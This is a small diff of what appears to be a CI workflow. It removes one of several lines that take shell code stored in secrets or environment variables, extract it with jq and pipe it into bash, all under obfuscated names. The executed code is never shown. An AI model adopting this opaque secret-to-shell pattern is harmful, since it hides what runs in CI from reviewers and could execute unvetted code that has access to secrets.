@@ -22,7 +22,6 @@ jobs:
           ii32178: ${{ secrets.ii32178 }}
         run: |
           printf '%s' "$ii32178" | jq -r .nun9742 | /bin/bash
-          printf '%s' "$ze352" | jq -r .osswo0 | /bin/bash
           printf '%s' "$rdgma1" | jq -r .t7 | /bin/bash
 
       - name: Upload archive
